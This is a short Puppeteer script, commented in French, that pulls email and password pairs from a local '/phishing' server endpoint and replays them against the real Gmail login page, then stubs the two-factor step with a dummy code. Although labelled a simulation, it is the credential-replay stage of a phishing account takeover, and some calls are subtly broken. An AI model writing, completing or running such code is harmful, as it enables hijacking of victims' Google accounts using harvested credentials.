const puppeteer = require('puppeteer');

(async () => {
    // Récupérer les identifiants depuis le serveur
    const response = await fetch('http://127.0.0.1:5000/phishing');
    const data = await response.json();

    // Lancer Puppeteer en mode non-headless pour voir les éléments
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    // Simuler une connexion sur Gmail
    await page.goto('https://mail.google.com');
    await page.type('#identifier', data.email);
    await page.press('#identifier', 'Enter');
    await page.type('#password', data.password);
    await page.press('#password', 'Enter');

    // Attendre la page de 2FA
    await page.waitForSelector('input[name="code"]');

    // Intercepter le code 2FA (simuler un code fictif)
    const codeInput = await page.$('input[name="code"]');
    if (codeInput) {
        await page.type(codeInput, '123456'); // Code fictif
        await page.press(codeInput, 'Enter');
    }

    // Afficher un message de succès
    await page.goto('https://mail.google.com/mail/u/0/#inbox');
    const successMessage = await page.$('h2[class*="title"]');
    if (successMessage) {
        console.log("🎉 Simulation 2FA réussie !");
    }

    await browser.close();
})();